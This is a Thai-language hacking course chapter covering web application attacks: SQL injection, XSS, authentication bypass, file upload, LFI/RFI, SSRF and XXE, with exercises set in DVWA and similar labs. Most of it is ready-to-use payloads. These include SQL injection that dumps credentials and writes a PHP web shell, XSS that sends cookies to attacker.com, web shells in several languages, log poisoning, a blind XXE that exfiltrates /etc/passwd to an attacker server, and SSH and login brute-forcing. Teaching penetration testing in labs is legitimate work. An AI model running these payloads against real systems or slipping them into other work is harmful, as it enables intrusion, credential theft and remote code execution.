# Part 07: Web Application Security (Steps 61-70)

## บทนำ

Web Application Security เป็นหนึ่งในสาขาที่ใหญ่และสำคัญที่สุดใน Cybersecurity ในบทนี้จะเรียนรู้การทดสอบ Web Applications ตั้งแต่พื้นฐาน OWASP Top 10 ไปจนถึงการโจมตีขั้นสูง

---

## Step 61: Burp Suite - Web Application Testing

### Burp Suite Setup

```bash
# ==========================================
# Burp Suite Community Edition
# ==========================================

# ติดตั้งบน Parrot OS (มาพร้อมแล้วส่วนใหญ่)
sudo apt install burpsuite

# หรือ download จาก portswigger.net/burp

# เปิด Burp Suite
burpsuite

# ==========================================
# Initial Setup
# ==========================================

# 1. เปิด Burp Suite
# 2. เลือก "Temporary project" > Next
# 3. "Use Burp defaults" > Start Burp

# 4. ตั้งค่า Proxy Listener
# Proxy > Options > Proxy Listeners
# Default: 127.0.0.1:8080

# 5. ตั้งค่า Browser
# Firefox > Settings > Network Settings > Manual Proxy
# HTTP Proxy: 127.0.0.1   Port: 8080

# 6. Install CA Certificate (สำหรับ HTTPS)
# เปิด Firefox > ไปที่ http://burp
# Download CA certificate
# Firefox > Settings > Certificates > View Certificates > Import

# ==========================================
# Burp Suite Tools
# ==========================================

# Proxy - Intercept HTTP traffic
# Target - Site map, scope
# Scanner - Automated scanning (Pro only)
# Intruder - Brute force, fuzzing
# Repeater - Manual testing
# Sequencer - Token analysis
# Decoder - Encode/decode data
# Comparer - Compare responses
# Logger - All requests
# Extender - Plugins

# ==========================================
# Basic Proxy Usage
# ==========================================

# Intercepting Request
# 1. เปิด "Intercept is on" ใน Proxy tab
# 2. Browse website
# 3. Burp จะแสดง request
# 4. แก้ไขได้ > Forward หรือ Drop

# Sending to Repeater
# Right click request > Send to Repeater
# ใน Repeater tab: แก้ไขและส่งซ้ำได้

# ==========================================
# Burp Suite Tips
# ==========================================

# Target Scope
# Target > Scope > Add item
# ใส่ target URL
# ตั้งค่า "Only show in-scope items"

# Search in Proxy History
# Proxy > HTTP history > Filter
# ค้นหาตาม URL, Method, Status, etc.

# Active Scanning (Pro)
# Right click request > Scan > Active scan
```

### Burp Intruder

```bash
# ==========================================
# Burp Intruder - Automated Testing
# ==========================================

# Attack Types:
# Sniper    - ทดสอบทีละ position
# Battering Ram - ใช้ payload เดียวกับทุก positions
# Pitchfork - ใช้ lists หลายอัน (1:1 mapping)
# Cluster Bomb - ใช้ทุก combinations

# ==========================================
# Brute Force Login
# ==========================================

# 1. Capture login request
# 2. Send to Intruder
# 3. เลือก Positions (username, password)
# 4. เลือก Attack type: Cluster Bomb
# 5. ใส่ payloads สำหรับ username และ password
# 6. ตั้งค่า grep match ตาม error message
# 7. Start attack

# ==========================================
# Fuzzing Parameters
# ==========================================

# ใช้ Intruder สำหรับ:
# - SQL Injection fuzzing
# - XSS fuzzing
# - Path traversal
# - IDOR testing
# - Parameter tampering

# ==========================================
# FUFF แทน Burp (command line)
# ==========================================

# Brute force login
ffuf -u http://example.com/login \
    -X POST \
    -d "username=FUZZUSER&password=FUZZPASS" \
    -w users.txt:FUZZUSER \
    -w passwords.txt:FUZZPASS \
    -fc 200

# Fuzzing parameters
ffuf -u "http://example.com/page?id=FUZZ" \
    -w /usr/share/wordlists/numbers.txt \
    -mc 200
```

---

## Step 62: SQL Injection

### SQL Injection Fundamentals

```bash
# ==========================================
# SQL Injection Overview
# ==========================================

# SQL Injection คือการแทรก SQL code เข้าไปใน input
# เพื่อ manipulate database queries

# ==========================================
# Types of SQL Injection
# ==========================================

# 1. In-Band SQL Injection
#    - Error-based: ดู error messages
#    - Union-based: ใช้ UNION SELECT

# 2. Blind SQL Injection
#    - Boolean-based: True/False response
#    - Time-based: SLEEP() function

# 3. Out-of-Band SQL Injection
#    - DNS/HTTP exfiltration

# ==========================================
# Basic SQL Injection Testing
# ==========================================

# ทดสอบด้วย single quote
http://example.com/page?id=1'
http://example.com/page?id=1''
http://example.com/page?id=1`
http://example.com/page?id=1``

# Boolean testing
http://example.com/page?id=1 AND 1=1--
http://example.com/page?id=1 AND 1=2--
http://example.com/page?id=1 OR 1=1--

# Comment styles
-- comment
# comment  
/* comment */
--+ comment (URL encoded +=%20)

# ==========================================
# UNION-based Injection
# ==========================================

# หาจำนวน columns
http://example.com/page?id=1 ORDER BY 1--
http://example.com/page?id=1 ORDER BY 2--
http://example.com/page?id=1 ORDER BY 3--
# ถ้า error ที่ ORDER BY 4 แสดงว่ามี 3 columns

# UNION SELECT
http://example.com/page?id=-1 UNION SELECT 1,2,3--
http://example.com/page?id=-1 UNION SELECT NULL,NULL,NULL--

# ดูข้อมูล database
http://example.com/page?id=-1 UNION SELECT 1,database(),3--
http://example.com/page?id=-1 UNION SELECT 1,version(),3--
http://example.com/page?id=-1 UNION SELECT 1,user(),3--

# ดูรายการ databases
http://example.com/page?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--

# ดูรายการ tables
http://example.com/page?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

# ดูรายการ columns
http://example.com/page?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

# ดูข้อมูล
http://example.com/page?id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users--

# ==========================================
# Error-based Injection (MySQL)
# ==========================================

# ใช้ extractvalue()
http://example.com/page?id=1 AND extractvalue(1,concat(0x7e,database()))--
http://example.com/page?id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))--

# ใช้ updatexml()
http://example.com/page?id=1 AND updatexml(1,concat(0x7e,database()),1)--

# ==========================================
# Blind Boolean-based
# ==========================================

# True condition (same response)
http://example.com/page?id=1 AND 1=1--

# False condition (different response)
http://example.com/page?id=1 AND 1=2--

# Extract data character by character
http://example.com/page?id=1 AND substring(database(),1,1)='a'--
http://example.com/page?id=1 AND substring(database(),1,1)='b'--

# ==========================================
# Time-based Blind
# ==========================================

# MySQL
http://example.com/page?id=1 AND SLEEP(5)--
http://example.com/page?id=1 AND IF(1=1,SLEEP(5),0)--
http://example.com/page?id=1 AND IF(substring(database(),1,1)='a',SLEEP(5),0)--

# MSSQL
http://example.com/page?id=1; WAITFOR DELAY '0:0:5'--

# PostgreSQL
http://example.com/page?id=1; SELECT pg_sleep(5)--

# ==========================================
# File Read/Write (MySQL)
# ==========================================

# อ่านไฟล์
http://example.com/page?id=-1 UNION SELECT 1,load_file('/etc/passwd'),3--

# เขียนไฟล์ (ต้องมี FILE privilege)
http://example.com/page?id=-1 UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE '/var/www/html/shell.php'--
```

### SQLmap - Automated SQL Injection

```bash
# ==========================================
# SQLmap
# ==========================================
sudo apt install sqlmap

# Basic usage
sqlmap -u "http://example.com/page?id=1"

# POST request
sqlmap -u "http://example.com/login" --data="user=admin&pass=admin"

# ใช้ cookies
sqlmap -u "http://example.com/page" --cookie="session=abc123"

# จาก Burp request file
sqlmap -r request.txt

# ==========================================
# SQLmap Options
# ==========================================

# ดู databases
sqlmap -u "http://example.com/page?id=1" --dbs

# ดู tables
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# ดู columns
sqlmap -u "http://example.com/page?id=1" -D db -T table --columns

# Dump data
sqlmap -u "http://example.com/page?id=1" -D db -T users --dump

# Dump all
sqlmap -u "http://example.com/page?id=1" --dump-all

# OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://example.com/page?id=1" --sql-shell

# ==========================================
# SQLmap Techniques
# ==========================================

# เลือก technique
sqlmap -u URL --technique=U    # Union-based
sqlmap -u URL --technique=E    # Error-based
sqlmap -u URL --technique=B    # Boolean-based
sqlmap -u URL --technique=T    # Time-based
sqlmap -u URL --technique=BEUSTQ  # All

# Bypass WAF
sqlmap -u URL --tamper=space2comment
sqlmap -u URL --tamper=randomcase
sqlmap -u URL --tamper=charencode
sqlmap -u URL --tamper="space2comment,randomcase"

# ดู tamper scripts
ls /usr/share/sqlmap/tamper/

# Level และ Risk
sqlmap -u URL --level=5 --risk=3  # Maximum testing

# Verbosity
sqlmap -u URL -v 3   # Debug output

# ==========================================
# SQLmap Examples
# ==========================================

# DVWA SQL Injection
sqlmap -u "http://192.168.1.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=xxx;security=low" \
    --dbs

# Login form
sqlmap -u "http://example.com/login" \
    --data="username=admin&password=admin" \
    --users --passwords

# Headers injection
sqlmap -u "http://example.com/" \
    -H "X-Forwarded-For: *" \
    --dbs
```

---

## Step 63: Cross-Site Scripting (XSS)

```bash
# ==========================================
# XSS - Cross-Site Scripting
# ==========================================

# Types:
# Reflected XSS  - รัน ณ ตอน request
# Stored XSS     - บันทึกใน database
# DOM-based XSS  - บน client side

# ==========================================
# Basic XSS Payloads
# ==========================================

# Alert (ทดสอบพื้นฐาน)
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# Image onerror
<img src=x onerror=alert(1)>
<img src=x onerror="alert(document.cookie)">

# SVG
<svg onload=alert(1)>
<svg/onload=alert(1)>

# Body tag
<body onload=alert(1)>
<body onerror=alert(1)>

# Input
<input onfocus=alert(1) autofocus>
<input onblur=alert(1)>

# href
<a href="javascript:alert(1)">Click</a>

# Iframe
<iframe src="javascript:alert(1)">

# Template literals
${alert(1)}

# ==========================================
# Filter Bypass Payloads
# ==========================================

# Case variations
<ScRiPt>alert(1)</sCriPt>
<SCRIPT>alert(1)</SCRIPT>

# No quotes
<img src=x onerror=alert(1)>

# HTML entities
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>

# Double encoding
%253Cscript%253E

# ==========================================
# Cookie Stealing
# ==========================================

# Malicious payload
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

# Attacker listener
python3 -m http.server 80
# หรือ
nc -lvp 80

# ==========================================
# XSS to CSRF
# ==========================================

# ใช้ XSS ส่ง request แทนผู้ใช้
<script>
fetch('/account/delete', {
    method: 'POST',
    credentials: 'include'
});
</script>

# ==========================================
# XSS Automation
# ==========================================

# XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

python3 xsstrike.py -u "http://example.com/page?search=FUZZ"
python3 xsstrike.py -u "http://example.com/page?search=test" --blind

# dalfox
go install github.com/hahwul/dalfox/v2@latest

dalfox url "http://example.com/page?q=test"
dalfox url "http://example.com/page?q=test" --cookie "session=abc"

# ==========================================
# DOM-based XSS
# ==========================================

# ดู JavaScript ที่ใช้ user input
document.write()
innerHTML
location.href
eval()
setTimeout()
setInterval()

# Sources (user-controlled)
location.hash
location.search
document.referrer
document.cookie
localStorage/sessionStorage

# Payloads for DOM XSS
#<img src=x onerror=alert(1)>
javascript:alert(1)
"><img src=x onerror=alert(1)>
```

---

## Step 64: Authentication Bypass

```bash
# ==========================================
# Authentication Testing
# ==========================================

# ==========================================
# 1. Default Credentials
# ==========================================

# Common defaults:
# admin:admin
# admin:password
# admin:123456
# root:root
# user:user
# test:test
# guest:guest

# SecLists default credentials
ls /usr/share/seclists/Passwords/Default-Credentials/

# ==========================================
# 2. Brute Force Login
# ==========================================

# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
    "//login:username=^USER^&password=^PASS^:Invalid credentials"

hydra -L users.txt -P passwords.txt 192.168.1.1 http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:wrong password"

# Hydra SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Medusa
medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# ==========================================
# 3. SQL Injection Authentication Bypass
# ==========================================

# Username field
admin'--
admin'#
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
') OR ('1'='1
admin' OR 1=1--
admin'--+

# Both username and password
Username: admin'--
Password: anything

# ==========================================
# 4. JWT Token Attacks
# ==========================================

# JWT Structure: header.payload.signature

# Decode JWT
python3 << 'EOF'
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode header
header = token.split('.')[0]
header += '=' * (4 - len(header) % 4)  # Add padding
print("Header:", json.loads(base64.b64decode(header)))

# Decode payload
payload = token.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
print("Payload:", json.loads(base64.b64decode(payload)))
EOF

# None Algorithm Attack
# เปลี่ยน alg เป็น "none" และลบ signature
python3 << 'EOF'
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "role": "admin"}

def b64_encode(data):
    return base64.b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

token = f"{b64_encode(header)}.{b64_encode(payload)}."
print(f"Forged token: {token}")
EOF

# HS256 Weak Secret Brute Force
pip3 install jwt-cracker
# หรือใช้ hashcat:
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# ==========================================
# 5. Password Reset Vulnerabilities
# ==========================================

# Host header injection
POST /reset-password
Host: attacker.com
# ถ้า server ส่ง email ที่มี link ใช้ Host header

# Token guessing
# Reset token ที่ weak เช่น timestamp, sequential

# Username enumeration via reset
# ถ้า response ต่างกันระหว่าง user ที่มีและไม่มี
```

---

## Step 65: OWASP Top 10 - In Practice

### A01: Broken Access Control

```bash
# ==========================================
# IDOR - Insecure Direct Object Reference
# ==========================================

# ตัวอย่าง: เปลี่ยน id ใน URL
# http://example.com/account?id=1234  (ของเรา)
# http://example.com/account?id=1235  (ของคนอื่น)
# http://example.com/account?id=1     (admin?)

# Testing with Burp:
# 1. ใช้งาน feature
# 2. ดู requests ใน Proxy
# 3. หา predictable IDs
# 4. Modify และส่ง

# Horizontal privilege escalation
# ใช้ account ของ User A เข้าถึงข้อมูล User B

# Vertical privilege escalation
# ใช้ account ของ User เข้าถึง Admin features

# Path Traversal
http://example.com/download?file=report.pdf
http://example.com/download?file=../../../etc/passwd
http://example.com/download?file=....//....//....//etc/passwd
http://example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# ==========================================
# A03: Injection
# ==========================================

# Command Injection
http://example.com/ping?host=127.0.0.1
http://example.com/ping?host=127.0.0.1;id
http://example.com/ping?host=127.0.0.1&&id
http://example.com/ping?host=127.0.0.1|id
http://example.com/ping?host=127.0.0.1`id`
http://example.com/ping?host=$(id)

# LDAP Injection
# Normal: (&(uid=user)(password=pass))
# Bypass: user=admin)(&  pass=anything
# Result: (&(uid=admin)(&)(password=anything))

# XPath Injection
# Normal: //users/user[username/text()='admin' and password/text()='pass']
# Bypass: admin' or '1'='1

# ==========================================
# A05: Security Misconfiguration
# ==========================================

# Default paths
/admin
/manager
/phpmyadmin
/wp-admin
/wp-login.php
/.git
/.env
/backup
/test
/dev

# Sensitive files
/robots.txt
/sitemap.xml
/crossdomain.xml
/clientaccesspolicy.xml
/.htaccess
/.htpasswd
/web.config
/config.php
/database.yml
/.DS_Store
/Thumbs.db

# Git exposed
/.git/config
/.git/HEAD
/.git/COMMIT_EDITMSG

# Backup files
/config.php.bak
/config.php.old
/index.php~
/admin.php.bak
```

---

## Step 66: File Upload Vulnerabilities

```bash
# ==========================================
# File Upload Attacks
# ==========================================

# ==========================================
# Bypass Extension Filters
# ==========================================

# Double extension
shell.php.jpg
shell.php.png
shell.php5

# Alternative extensions
.php3, .php4, .php5, .php7, .phtml, .phar
.asp, .aspx, .ashx, .asmx
.jsp, .jspx

# Mixed case
shell.PHP
shell.PhP

# Null byte (เก่า)
shell.php%00.jpg
shell.php\x00.jpg

# ==========================================
# Web Shell Payloads
# ==========================================

# PHP Web Shell (simple)
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

# PHP Web Shell (advanced)
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo '<pre>' . shell_exec($cmd) . '</pre>';
}
?>

# One-liner
<?=`$_GET[0]`?>

# ASP Web Shell
<% eval request("cmd") %>
<%@ Language=VBScript %>
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.Form("cmd")).StdOut.ReadLine()) %>

# ASPX
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start(Request["cmd"]); %>

# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# ==========================================
# MIME Type Bypass
# ==========================================

# เปลี่ยน Content-Type ใน Burp
Content-Type: image/jpeg   (แม้จะส่ง PHP file)
Content-Type: image/png

# ==========================================
# Exiftool - Hide in Image
# ==========================================
sudo apt install exiftool

# แทรก PHP code ใน EXIF data
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# ==========================================
# Image Resampling Bypass
# ==========================================

# บาง sites resize images (ทำลาย PHP code ได้)
# วิธีแก้: ใส่ PHP ใน pixels

python3 << 'EOF'
from PIL import Image
import struct

# สร้าง valid PNG ที่มี PHP code
def create_php_png(filename):
    img = Image.new('RGB', (1, 1), color='white')
    
    # PHP code ที่จะใส่
    php_code = b'<?php system($_GET["cmd"]); ?>'
    
    # บันทึกเป็น PNG
    img.save(filename + '.png')
    
    # เพิ่ม PHP code
    with open(filename + '.png', 'ab') as f:
        f.write(php_code)
    
    print(f"Created {filename}.png with PHP payload")

create_php_png('shell')
EOF
```

---

## Step 67: Directory Traversal & LFI/RFI

```bash
# ==========================================
# Path Traversal / Directory Traversal
# ==========================================

# Basic traversal
?file=../../../etc/passwd
?path=....//....//etc/passwd

# Encoding variants
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=%252e%252e%252f                   # Double encoding
?file=..%c0%af../                       # Unicode/UTF-8

# Windows traversal
?file=..\..\..\ windows\system32\drivers\etc\hosts
?file=..\..\..\ boot.ini

# ==========================================
# LFI - Local File Inclusion
# ==========================================

# PHP code:
# include($_GET['page']);
# require($_GET['file']);

# Read system files
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../etc/hosts
?page=../../../../etc/mysql/my.cnf
?page=../../../../var/log/apache2/access.log
?page=../../../../proc/self/environ
?page=../../../../proc/version

# PHP filters
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/read=string.toupper/resource=index.php
?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

# PHP Wrappers
?page=php://input
# ส่ง POST data: <?php system('id'); ?>

?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# LFI to RCE via Log Poisoning
# 1. ส่ง PHP code ใน User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://example.com/

# 2. Include log file
?page=../../../../var/log/apache2/access.log&cmd=id

# LFI via /proc/self/environ
# ส่ง payload ใน User-Agent
curl -A "<?php system('id'); ?>" http://example.com/
# Include
?page=../../../../proc/self/environ

# ==========================================
# RFI - Remote File Inclusion
# ==========================================

# PHP config allow_url_include=On ต้องเปิด (ปิดโดย default)
?page=http://attacker.com/shell.php
?page=https://attacker.com/shell.php

# สร้าง shell บน attacker server
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
python3 -m http.server 80

# ==========================================
# LFI Tools
# ==========================================

# kadimus
git clone https://github.com/P0cL4bs/kadimus.git
cd kadimus
./kadimus -u "http://example.com/?page=FUZZ" 

# liffy
python3 liffy.py -t "http://example.com/?page=FUZZ"
```

---

## Step 68: SSRF - Server-Side Request Forgery

```bash
# ==========================================
# SSRF - Server-Side Request Forgery
# ==========================================

# SSRF คือการบังคับให้ server ส่ง request
# ไปยัง target ที่ผู้โจมตีกำหนด

# ==========================================
# Finding SSRF
# ==========================================

# Parameters ที่อาจมี SSRF:
# url=, link=, src=, href=, destination=
# callback=, continue=, data=, domain=, feed=
# file=, from=, host=, image=, img=
# load=, next=, open=, path=, redirect=
# reference=, return=, site=, to=, uri=

# ==========================================
# Basic SSRF
# ==========================================

# เข้าถึง internal services
?url=http://localhost/
?url=http://127.0.0.1/
?url=http://0.0.0.0/
?url=http://internal-service/

# Cloud Metadata (สำคัญมาก!)
?url=http://169.254.169.254/
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS Metadata
?url=http://169.254.169.254/latest/meta-data/ami-id
?url=http://169.254.169.254/latest/meta-data/hostname
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name

# Google Cloud Metadata
?url=http://metadata.google.internal/computeMetadata/v1/

# Azure IMDS
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# ==========================================
# SSRF Filter Bypass
# ==========================================

# Alternative IP representations
http://2130706433/          # 127.0.0.1 in decimal
http://0x7f000001/          # 127.0.0.1 in hex
http://017700000001/        # 127.0.0.1 in octal
http://127.1/               # Short form
http://127.0.1/

# DNS Rebinding
http://attacker.com         # resolve ไปที่ 169.254.169.254

# Redirect
http://attacker.com/redirect?url=http://169.254.169.254/

# IPv6
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# Encoded characters
http://127.0.0.1%09/
http://localhost%23/
```

---

## Step 69: XXE - XML External Entity

```bash
# ==========================================
# XXE - XML External Entity Injection
# ==========================================

# XXE เกิดเมื่อ XML parser process external entities

# ==========================================
# Basic XXE
# ==========================================

# อ่าน local file
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

# อ่าน /etc/shadow
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<data>&xxe;</data>

# SSRF ผ่าน XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>

# ==========================================
# Blind XXE
# ==========================================

# Out-of-band (Exfiltrate ผ่าน DNS/HTTP)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>&send;</data>

# evil.dtd on attacker server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;

# ==========================================
# XXE with PHP Wrapper
# ==========================================

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>

# Decode base64 output:
echo "base64_output" | base64 -d

# ==========================================
# Tools
# ==========================================

# xxeinjector
git clone https://github.com/enjoiz/XXEinjector.git

ruby XXEinjector.rb --host=attacker --path=/etc/passwd --file=request.xml
```

---

## Step 70: Web Vulnerability Scanners

```bash
# ==========================================
# Automated Web Vulnerability Scanning
# ==========================================

# ==========================================
# Nikto - Web Server Scanner
# ==========================================
sudo apt install nikto

# Basic scan
nikto -h http://example.com
nikto -h http://example.com -port 443 -ssl

# Scan ทุก port
nikto -h 192.168.1.1 -port 80,443,8080

# Output
nikto -h http://example.com -o output.html -Format html
nikto -h http://example.com -o output.xml -Format xml

# ใช้ proxy
nikto -h http://example.com -useproxy http://127.0.0.1:8080

# ==========================================
# OWASP ZAP - Web Application Proxy
# ==========================================
sudo apt install zaproxy

# เปิด ZAP
zaproxy &

# ZAP API
# เปิด ZAP > Tools > Options > API

# ด้วย Python
pip3 install python-owasp-zap-v2.4

python3 << 'EOF'
from zapv2 import ZAPv2

zap = ZAPv2(apikey='changeme', proxies={'http': 'http://127.0.0.1:8080'})

target = 'http://example.com'

# Spider
zap.spider.scan(target)
import time
time.sleep(5)

# Active scan
zap.ascan.scan(target)
while int(zap.ascan.status()) < 100:
    print(f'Scan progress: {zap.ascan.status()}%')
    time.sleep(5)

# Alerts
alerts = zap.core.alerts(baseurl=target)
for alert in alerts:
    print(f"{alert['risk']}: {alert['alert']} at {alert['url']}")
EOF

# ==========================================
# Nuclei - Template-based Scanner
# ==========================================

# ติดตั้ง
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
nuclei -update-templates

# Basic scan
nuclei -u http://example.com
nuclei -l targets.txt

# Specific templates
nuclei -u http://example.com -t cves/
nuclei -u http://example.com -t vulnerabilities/
nuclei -u http://example.com -t exposed-panels/

# By severity
nuclei -u http://example.com -severity critical,high

# ==========================================
# WPScan - WordPress Scanner
# ==========================================
sudo apt install wpscan

# Basic scan
wpscan --url http://example.com

# ดู plugins
wpscan --url http://example.com --enumerate p

# ดู themes
wpscan --url http://example.com --enumerate t

# ดู users
wpscan --url http://example.com --enumerate u

# Password brute force
wpscan --url http://example.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt

# API token (เพิ่ม results)
wpscan --url http://example.com --api-token YOUR_TOKEN
```

---

## สรุป Part 07

ในบทนี้คุณได้เรียนรู้:

✅ **Step 61**: Burp Suite พื้นฐาน  
✅ **Step 62**: SQL Injection + SQLmap  
✅ **Step 63**: XSS - Cross-Site Scripting  
✅ **Step 64**: Authentication Bypass  
✅ **Step 65**: OWASP Top 10 ในทางปฏิบัติ  
✅ **Step 66**: File Upload Vulnerabilities  
✅ **Step 67**: Directory Traversal & LFI/RFI  
✅ **Step 68**: SSRF  
✅ **Step 69**: XXE  
✅ **Step 70**: Web Vulnerability Scanners  

## แบบฝึกหัด (ใน DVWA / HackTheBox / TryHackMe)

1. ทำ SQL Injection ใน DVWA ทุก security levels
2. ขโมย cookies ด้วย Stored XSS
3. Bypass file upload และ execute web shell
4. ทำ LFI เพื่ออ่าน /etc/passwd
5. ทดสอบ authentication bypass ด้วย SQL injection

## ถัดไป: Part 08 - Exploitation & Metasploit

---

*Part 07 | Steps 61-70 | ระดับ: กลาง-สูง*
